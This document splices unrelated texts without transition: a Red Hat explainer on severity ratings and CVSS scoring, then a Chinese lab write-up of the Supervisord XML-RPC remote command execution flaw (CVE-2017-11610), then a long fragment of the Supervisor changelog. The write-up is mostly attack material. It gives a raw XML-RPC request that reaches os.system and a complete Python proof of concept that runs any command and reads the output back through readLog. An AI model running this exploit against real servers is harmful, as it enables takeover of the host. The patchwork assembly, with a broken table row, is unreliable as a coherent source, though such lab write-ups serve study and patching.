# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

# Supervisord 远程命令执行漏洞（CVE-2017-11610）

参考链接：

* <https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html>
* <https://blogs.securiteam.com/index.php/archives/3348>
* <https://github.com/Supervisor/supervisor/commit/90c5df80777bfec03d041740465027f83d22e27b>

## 运行环境

```
docker compose build
docker compose up -d

```

环境启动后，访问`http://your-ip:9001`即可查看Supervisord的页面。

## 漏洞测试

直接执行任意命令：

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 213

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>touch /tmp/success</string>
</param>
</params>
</methodCall>

```

## 关于直接回显的POC

@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。

写了个简单的POC： [poc.py](/vulhub/vulhub/blob/master/supervisor/CVE-2017-11610/poc.py)，直接贴出来吧：

```
#!/usr/bin/env python3
import xmlrpc.client
import sys

target = sys.argv[1]
command = sys.argv[2]
with xmlrpc.client.ServerProxy(target) as proxy:
    old = getattr(proxy, 'supervisor.readLog')(0,0)

    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
    result = getattr(proxy, 'supervisor.readLog')(0,0)

    print(result[len(old):])
```

使用Python3执行并获取结果：`./poc.py "http://your-ip:9001/RPC2" "command"`：

- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.0 (2013-07-30)----------------
- Parsing the config file will now fail with an error message if a process or group name contains characters that are not compatible with the eventlistener protocol.
- Fixed a bug where the ``tail -f`` command in ``supervisorctl`` would fail if the combined length of the username and password was over 56 characters.
- Reading the config file now gives a separate error message when the config file exists but can't be read. Previously, any error reading the file would be reported as "could not find config file". Patch by Jens Rantil.
- Fixed an XML-RPC bug where array elements after the first would be ignored when using the ElementTree-based XML parser. Patch by Zev Benjamin.
- Fixed the usage message output by ``supervisorctl`` to show the correct default config file path. Patch by Alek Storm.
3.0b2 (2013-05-28)------------------
- The behavior of the program option ``user`` has changed. In all previous versions, if ``supervisord`` failed to switch to the user, a warning would be sent to the stderr log but the child process would still be spawned. This means that a mistake in the config file could result in a child process being unintentionally spawned as root. Now, ``supervisord`` will not spawn the child unless it was able to successfully switch to the user. Thanks to Igor Partola for reporting this issue.
- If a user specified in the config file does not exist on the system, ``supervisord`` will now print an error and refuse to start.
- Reverted a change to logging introduced in 3.0b1 that was intended to allow multiple processes to log to the same file with the rotating log handler. The implementation caused supervisord to crash during reload and to leak file handles. Also, since log rotation options are given on a per-program basis, impossible configurations could be created (conflicting rotation options for the same file). Given this and that supervisord now has syslog support, it was decided to remove this feature. A warning was added to the documentation that two processes may not log to the same file.
- Fixed a bug where parsing ``command=`` could cause supervisord to crash if shlex.split() fails, such as a bad quoting. Patch by Scott Wilson.
- It is now possible to use ``supervisorctl`` on a machine with no ``supervisord.conf`` file by supplying the connection information in command line options. Patch by Jens Rantil.
- Fixed a bug where supervisord would crash if the syslog handler was used and supervisord received SIGUSR2 (log reopen request).
- Fixed an XML-RPC bug where calling supervisor.getProcessInfo() with a bad name would cause a 500 Internal Server Error rather than the returning a BAD\_NAME fault.
- Added a favicon to the web interface. Patch by Caio Ariede.
- Fixed a test failure due to incorrect handling of daylight savings time in the childutils tests. Patch by Ildar Hizbulin.
- Fixed a number of pyflakes warnings for unused variables, imports, and dead code. Patch by Philippe Ombredanne.
3.0b1 (2012-09-10)------------------
- Fixed a bug where parsing ``environment=`` did not verify that key/value pairs were correctly separated. Patch by Martijn Pieters.
- Fixed a bug in the HTTP server code that could cause unnecessary delays when sending large responses. Patch by Philip Zeyliger.
- When supervisord starts up as root, if the ``-c`` flag was not provided, a warning is now emitted to the console. Rationale: supervisord looks in the current working directory for a ``supervisord.conf`` file; someone might trick the root user into starting supervisord while cd'ed into a directory that has a rogue ``supervisord.conf``.
- A warning was added to the documentation about the security implications of starting supervisord without the ``-c`` flag.
- Add a boolean program option ``stopasgroup``, defaulting to false. When true, the flag causes supervisor to send the stop signal to the whole process group. This is useful for programs, such as Flask in debug mode, that do not propagate stop signals to their children, leaving them orphaned.
- Python 2.3 is no longer supported. The last version that supported Python 2.3 is Supervisor 3.0a12.
- Removed the unused "supervisor\_rpc" entry point from setup.py.
- Fixed a bug in the rotating log handler that would cause unexpected results when two processes were set to log to the same file. Patch by Whit Morriss.
- Fixed a bug in config file reloading where each reload could leak memory because a list of warning messages would be appended but never cleared. Patch by Philip Zeyliger.
- Added a new Syslog log handler. Thanks to Denis Bilenko, Nathan L. Smith, and Jason R. Coombs, who each contributed to the patch.
- Put all change history into a single file (CHANGES.txt).
3.0a12 (2011-12-06)-------------------
- Released to replace a broken 3.0a11 package where non-Python files were not included in the package.
3.0a11 (2011-12-06)-------------------
- Added a new file, ``PLUGINS.rst``, with a listing of third-party plugins for Supervisor. Contributed by Jens Rantil.
- The ``pid`` command in supervisorctl can now be used to retrieve the PIDs of child processes. See ``help pid``. Patch by Gregory Wisniewski.
- Added a new ``host\_node\_name`` expansion that will be expanded to the value returned by Python's ``platform.node`` (see http://docs.python.org/library/platform.html#platform.node). Patch by Joseph Kondel.
- Fixed a bug in the web interface where pages over 64K would be truncated. Thanks to Drew Perttula and Timothy Jones for reporting this.
- Renamed ``README.txt`` to ``README.rst`` so GitHub renders the file as ReStructuredText.
- The XML-RPC server is now compatible with clients that do not send empty <params> when there are no parameters for the method call. Thanks to Johannes Becker for reporting this.
- Fixed ``supervisorctl --help`` output to show the correct program name.
- The behavior of the configuration options ``minfds`` and ``minprocs`` has changed. Previously, if a hard limit was less than ``minfds`` or ``minprocs``, supervisord would unconditionally abort with an error. Now, supervisord will attempt to raise the hard limit. This may succeed if supervisord is run as root, otherwise the error is printed as before. Patch by Benoit Sigoure.
- Add a boolean program option ``killasgroup``, defaulting to false, if true when resorting to send SIGKILL to stop/terminate the process send it to its whole process group instead to take care of possible children as well and not leave them behind. Patch by Samuele Pedroni.
- Environment variables may now be used in the configuration file for options that support string expansion. Patch by Aleksey Sivokon.
- Fixed a race condition where supervisord might not act on a signal sent to it. Thanks to Adar Dembo for reporting the issue and supplying the initial patch.
- Updated the output of ``echo\_supervisord\_conf`` to fix typos and improve comments. Thanks to Jens Rantil for noticing these.
- Fixed a possible 500 Server Error from the web interface. This was observed when using Supervisor on a domain socket behind Nginx, where Supervisor would raise an exception because REMOTE\_ADDR was not set. Patch by David Bennett.
3.0a10 (2011-03-30)-------------------
- Fixed the stylesheet of the web interface so the footer line won't overlap a long process list. Thanks to Derek DeVries for the patch.
- Allow rpc interface plugins to register new events types.
- Bug fix for FCGI sockets not getting cleaned up when the ``reload`` command is issued from supervisorctl. Also, the default behavior has changed for FCGI sockets. They are now closed whenever the number of running processes in a group hits zero. Previously, the sockets were kept open unless a group-level stop command was issued.
- Better error message when HTTP server cannot reverse-resolve a hostname to an IP address. Previous behavior: show a socket error. Current behavior: spit out a suggestion to stdout.
- Environment variables set via ``environment=`` value within ``[supervisord]`` section had no effect. Thanks to Wyatt Baldwin for a patch.
- Fix bug where stopping process would cause process output that happened after the stop request was issued to be lost. See https://github.com/Supervisor/supervisor/issues/11.
- Moved 2.X change log entries into ``HISTORY.txt``.
- Converted ``CHANGES.txt`` and ``README.txt`` into proper ReStructuredText and included them in the ``long\_description`` in ``setup.py``.
- Added a tox.ini to the package (run via ``tox`` in the package dir). Tests supervisor on multiple Python versions.
3.0a9 (2010-08-13)------------------
- Use rich comparison methods rather than \_\_cmp\_\_ to sort process configs and process group configs to better straddle Python versions. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed test\_supervisorctl.test\_maintail\_dashf test for Python 2.7. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed the way that supervisor.datatypes.url computes a "good" URL for compatibility with Python 2.7 and Python >= 2.6.5. URLs with bogus "schemes://" will now be accepted as a version-straddling compromise (before they were rejected before supervisor would start). (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Add a ``-v`` / ``--version`` option to supervisord: Print the supervisord version number out to stdout and exit. (Roger Hoover)
- Import iterparse from xml.etree when available (eg: Python 2.6). Patch by Sidnei da Silva.
- Fixed the url to the supervisor-users mailing list. Patch by Sidnei da Silva
- When parsing "environment=" in the config file, changes introduced in 3.0a8 prevented Supervisor from parsing some characters commonly found in paths unless quoting was used as in this example::
 environment=HOME='/home/auser'
 Supervisor once again allows the above line to be written as::
 environment=HOME=/home/auser
 Alphanumeric characters, "\_", "/", ".", "+", "-", "(", ")", and ":" can all be used as a value without quoting. If any other characters are needed in the value, please quote it as in the first example above. Thanks to Paul Heideman for reporting this issue.
- Supervisor will now look for its config file in locations relative to the executable path, allowing it to be used more easily in virtual environments. If sys.argv[0] is ``/path/to/venv/bin/supervisorctl``, supervisor will now look for it's config file in ``/path/to/venv/etc/supervisord.conf`` and ``/path/to/venv/supervisord.conf`` in addition to the other standard locations. Patch by Chris Rossi.
3.0a8 (2010-01-20)------------------
- Don't cleanup file descriptors on first supervisord invocation: this is a lame workaround for Snow Leopard systems that use libdispatch and are receiving "Illegal instruction" messages at supervisord startup time. Restarting supervisord via "supervisorctl restart" may still cause a crash on these systems.
- Got rid of Medusa hashbang headers in various files to ease RPM packaging.
- Allow umask to be 000 (patch contributed by Rowan Nairn).
- Fixed a bug introduced in 3.0a7 where supervisorctl wouldn't ask for a username/password combination properly from a password-protected supervisord if it wasn't filled in within the "[supervisorctl]" section username/password values. It now properly asks for a username and password.
- Fixed a bug introduced in 3.0a7 where setup.py would not detect the Python version correctly. Patch by Daniele Paolella.
- Fixed a bug introduced in 3.0a7 where parsing a string of key/value pairs failed on Python 2.3 due to use of regular expression syntax introduced in Python 2.4.
- Removed the test suite for the ``memmon`` console script, which was moved to the Superlance package in 3.0a7.
- Added release dates to CHANGES.txt.
- Reloading the config for an fcgi process group did not close the fcgi socket - now, the socket is closed whenever the group is stopped as a unit (including during config update). However, if you stop all the processes in a group individually, the socket will remain open to allow for graceful restarts of FCGI daemons. (Roger Hoover)
- Rereading the config did not pick up changes to the socket parameter in a fcgi-program section. (Roger Hoover)
- Made a more friendly exception message when a FCGI socket cannot be created. (Roger Hoover)
- Fixed a bug where the --serverurl option of supervisorctl would not accept a URL with a "unix" scheme. (Jason Kirtland)
- Running the tests now requires the "mock" package. This dependency has been added to "tests\_require" in setup.py. (Roger Hoover)
- Added support for setting the ownership and permissions for an FCGI socket. This is done using new "socket\_owner" and "socket\_mode" options in an [fcgi-program:x] section. See the manual for details. (Roger Hoover)
- Fixed a bug where the FCGI socket reference count was not getting decremented on spawn error. (Roger Hoover)
- Fixed a Python 2.6 deprecation warning on use of the "sha" module.
- Updated ez\_setup.py to one that knows about setuptools 0.6c11.
- Running "supervisorctl shutdown" no longer dumps a Python backtrace when it can't connect to supervisord on the expected socket. Thanks to Benjamin Smith for reporting this.
- Removed use of collections.deque in our bundled version of asynchat because it broke compatibility with Python 2.3.
- The sample configuration output by "echo\_supervisord\_conf" now correctly shows the default for "autorestart" as "unexpected". Thanks to William Dode for noticing it showed the wrong value.
3.0a7 (2009-05-24)------------------
- We now bundle our own patched version of Medusa contributed by Jason Kirtland to allow Supervisor to run on Python 2.6. This was done because Python 2.6 introduced backwards incompatible changes to asyncore and asynchat in the stdlib.
- The console script ``memmon``, introduced in Supervisor 3.0a4, has been moved to Superlance (http://pypi.python.org/pypi/superlance). The Superlance package contains other useful monitoring tools designed to run under Supervisor.
- Supervisorctl now correctly interprets all of the error codes that can be returned when starting a process. Patch by Francesc Alted.
- New ``stdout\_events\_enabled`` and ``stderr\_events\_enabled`` config options have been added to the ``[program:x]``, ``[fcgi-program:x]``, and ``[eventlistener:x]`` sections. These enable the emitting of new PROCESS\_LOG events for a program. If unspecified, the default is False.
 If enabled for a subprocess, and data is received from the stdout or stderr of the subprocess while not in the special capture mode used by PROCESS\_COMMUNICATION, an event will be emitted.
 Event listeners can subscribe to either PROCESS\_LOG\_STDOUT or PROCESS\_LOG\_STDERR individually, or PROCESS\_LOG for both.
- Values for subprocess environment variables specified with environment= in supervisord.conf can now be optionally quoted, allowing them to contain commas. Patch by Tim Godfrey.
- Added a new event type, REMOTE\_COMMUNICATION, that is emitted by a new RPC method, supervisor.sendRemoteCommEvent().
- Patch for bug #268 (KeyError on ``here`` expansion for stdout/stderr\_logfile) from David E. Kindred.
- Add ``reread``, ``update``, and ``avail`` commands based on Anders Quist's ``online\_config\_reload.diff`` patch. This patch extends the "add" and "drop" commands with automagical behavior::
 In supervisorctl:
 supervisor> status bar RUNNING pid 14864, uptime 18:03:42 baz RUNNING pid 23260, uptime 0:10:16 foo RUNNING pid 14866, uptime 18:03:42 gazonk RUNNING pid 23261, uptime 0:10:16 supervisor> avail bar in use auto 999:999 baz in use auto 999:999 foo in use auto 999:999 gazonk in use auto 999:999 quux avail auto 999:999
 Now we add this to our conf:
 [group:zegroup] programs=baz,gazonk
 Then we reread conf:
 supervisor> reread baz: disappeared gazonk: disappeared quux: available zegroup: available supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux avail auto 999:999 zegroup:baz avail auto 999:999 zegroup:gazonk avail auto 999:999 supervisor> status bar RUNNING pid 14864, uptime 18:04:18 baz RUNNING pid 23260, uptime 0:10:52 foo RUNNING pid 14866, uptime 18:04:18 gazonk RUNNING pid 23261, uptime 0:10:52
 The magic make-it-so command:
 supervisor> update baz: stopped baz: removed process group gazonk: stopped gazonk: removed process group zegroup: added process group quux: added process group supervisor> status bar RUNNING pid 14864, uptime 18:04:43 foo RUNNING pid 14866, uptime 18:04:43 quux RUNNING pid 23561, uptime 0:00:02 zegroup:baz RUNNING pid 23559, uptime 0:00:02 zegroup:gazonk RUNNING pid 23560, uptime 0:00:02 supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux in use auto 999:999 zegroup:baz in use auto 999:999 zegroup:gazonk in use auto 999:999
- Fix bug with symptom "KeyError: 'process\_name'" when using a logfile name including documented``process\_name`` Python string expansions.
- Tab completions in the supervisorctl shell, and a foreground mode for Supervisor, implemented as a part of GSoC. The supervisorctl program now has a ``fg`` command, which makes it possible to supply inputs to a process, and see its output/error stream in real time.
- Process config reloading implemented by Anders Quist. The supervisorctl program now has the commands "add" and "drop". "add <programname>" adds the process group implied by <programname> in the config file. "drop <programname>" removes the process group from the running configuration (it must already be stopped). This makes it possible to add processes to and remove processes from a running supervisord without restarting the supervisord process.
- Fixed a bug where opening the HTTP servers would fail silently for socket errors other than errno.EADDRINUSE.
- Thanks to Dave Peticolas, using "reload" against a supervisord that is running in the background no longer causes supervisord to crash.
- Configuration options for logfiles now accept mixed case reserved words (e.g. "AUTO" or "auto") for consistency with other options.
- childutils.eventdata was buggy, it could not deal with carriage returns in data. See http://www.plope.com/software/collector/257. Thanks to Ian Bicking.
- Per-process exitcodes= configuration now will not accept exit codes that are not 8-bit unsigned integers (supervisord will not start when one of the exit codes is outside the range of 0 - 255).
- Per-process ``directory`` value can now contain expandable values like ``%(here)s``. (See http://www.plope.com/software/collector/262).
- Accepted patch from Roger Hoover to allow for a new sort of process group: "fcgi-program". Adding one of these to your supervisord.conf allows you to control fastcgi programs. FastCGI programs cannot belong to heterogenous groups.
 The configuration for FastCGI programs is the same as regular programs except an additional "socket" parameter. Substitution happens on the socket parameter with the ``here`` and ``program\_name`` variables::
 [fcgi-program:fcgi\_test] ;socket=tcp://localhost:8002 socket=unix:///path/to/fcgi/socket
- Supervisorctl now supports a plugin model for supervisorctl commands.
- Added the ability to retrieve supervisord's own pid through supervisor.getPID() on the XML-RPC interface or a new "pid" command on supervisorctl.
3.0a6 (2008-04-07)------------------
- The RotatingFileLogger had a race condition in its doRollover method whereby a file might not actually exist despite a call to os.path.exists on the line above a place where we try to remove it. We catch the exception now and ignore the missing file.
3.0a5 (2008-03-13)------------------
- Supervisorctl now supports persistent readline history. To enable, add "history\_file = <pathname>" to the ``[supervisorctl]`` section in your supervisord.conf file.
- Multiple commands may now be issued on one supervisorctl command line, e.g. "restart prog; tail -f prog". Separate commands with a single semicolon; they will be executed in order as you would expect.
3.0a4 (2008-01-30)------------------
- 3.0a3 broke Python 2.3 backwards compatibility.
- On Debian Sarge, one user reported that a call to options.mktempfile would fail with an "[Errno 9] Bad file descriptor" at supervisord startup time. I was unable to reproduce this, but we found a workaround that seemed to work for him and it's included in this release. See http://www.plope.com/software/collector/252 for more information. Thanks to William Dode.
- The fault ``ALREADY\_TERMINATED`` has been removed. It was only raised by supervisor.sendProcessStdin(). That method now returns ``NOT\_RUNNING`` for parity with the other methods. (Mike Naberezny)
- The fault TIMED\_OUT has been removed. It was not used.
- Supervisor now depends on meld3 0.6.4, which does not compile its C extensions by default, so there is no more need to faff around with NO\_MELD3\_EXTENSION\_MODULES during installation if you don't have a C compiler or the Python development libraries on your system.
- Instead of making a user root around for the sample.conf file, provide a convenience command "echo\_supervisord\_conf", which he can use to echo the sample.conf to his terminal (and redirect to a file appropriately). This is a new user convenience (especially one who has no Python experience).
- Added ``numprocs\_start`` config option to ``[program:x]`` and ``[eventlistener:x]`` sections. This is an offset used to compute the first integer that ``numprocs`` will begin to start from. Contributed by Antonio Beamud Montero.
- Added capability for ``[include]`` config section to config format. This section must contain a single key "files", which must name a space-separated list of file globs that will be included in supervisor's configuration. Contributed by Ian Bicking.
- Invoking the ``reload`` supervisorctl command could trigger a bug in supervisord which caused it to crash. See http://www.plope.com/software/collector/253 . Thanks to William Dode for a bug report.
- The ``pidproxy`` script was made into a console script.
- The ``password`` value in both the ``[inet\_http\_server]`` and ``[unix\_http\_server]`` sections can now optionally be specified as a SHA hexdigest instead of as cleartext. Values prefixed with ``{SHA}`` will be considered SHA hex digests. To encrypt a password to a form suitable for pasting into the configuration file using Python, do, e.g.::
 >>> import sha >>> '{SHA}' + sha.new('thepassword').hexdigest() '{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d'
- The subtypes of the events PROCESS\_STATE\_CHANGE (and PROCESS\_STATE\_CHANGE itself) have been removed, replaced with a simpler set of PROCESS\_STATE subscribable event types.
 The new event types are:
 PROCESS\_STATE\_STOPPED PROCESS\_STATE\_EXITED PROCESS\_STATE\_STARTING PROCESS\_STATE\_STOPPING PROCESS\_STATE\_BACKOFF PROCESS\_STATE\_FATAL PROCESS\_STATE\_RUNNING PROCESS\_STATE\_UNKNOWN PROCESS\_STATE # abstract
 PROCESS\_STATE\_STARTING replaces:
 PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_STOPPED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_BACKOFF PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_EXITED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_FATAL
 PROCESS\_STATE\_RUNNING replaces PROCESS\_STATE\_CHANGE\_RUNNING\_FROM\_STARTED
 PROCESS\_STATE\_BACKOFF replaces PROCESS\_STATE\_CHANGE\_BACKOFF\_FROM\_STARTING
 PROCESS\_STATE\_STOPPING replaces:
 PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_RUNNING PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_STARTING
 PROCESS\_STATE\_EXITED replaces PROCESS\_STATE\_CHANGE\_EXITED\_FROM\_RUNNING
 PROCESS\_STATE\_STOPPED replaces PROCESS\_STATE\_CHANGE\_STOPPED\_FROM\_STOPPING
 PROCESS\_STATE\_FATAL replaces PROCESS\_STATE\_CHANGE\_FATAL\_FROM\_BACKOFF
 PROCESS\_STATE\_UNKNOWN replaces PROCESS\_STATE\_CHANGE\_TO\_UNKNOWN
 PROCESS\_STATE replaces PROCESS\_STATE\_CHANGE
 The PROCESS\_STATE\_CHANGE\_EXITED\_OR\_STOPPED abstract event is gone.
 All process state changes have at least "processname", "groupname", and "from\_state" (the name of the previous state) in their serializations.
 PROCESS\_STATE\_EXITED additionaly has "expected" (1 or 0) and "pid" (the process id) in its serialization.
 PROCESS\_STATE\_RUNNING, PROCESS\_STATE\_STOPPING, PROCESS\_STATE\_STOPPED additionally have "pid" in their serializations.
 PROCESS\_STATE\_STARTING and PROCESS\_STATE\_BACKOFF have "tries" in their serialization (initially "0", bumped +1 each time a start retry happens).
- Remove documentation from README.txt, point people to http://supervisord.org/manual/ .
- The eventlistener request/response protocol has changed. OK/FAIL must now be wrapped in a RESULT envelope so we can use it for more specialized communications.
 Previously, to signify success, an event listener would write the string ``OK\n`` to its stdout. To signify that the event was seen but couldn't be handled by the listener and should be rebuffered, an event listener would write the string ``FAIL\n`` to its stdout.
 In the new protocol, the listener must write the string::
 RESULT {resultlen}\n{result}
 For example, to signify OK::
 RESULT 2\nOK
 To signify FAIL::
 RESULT 4\nFAIL
 See the scripts/sample\_eventlistener.py script for an example.
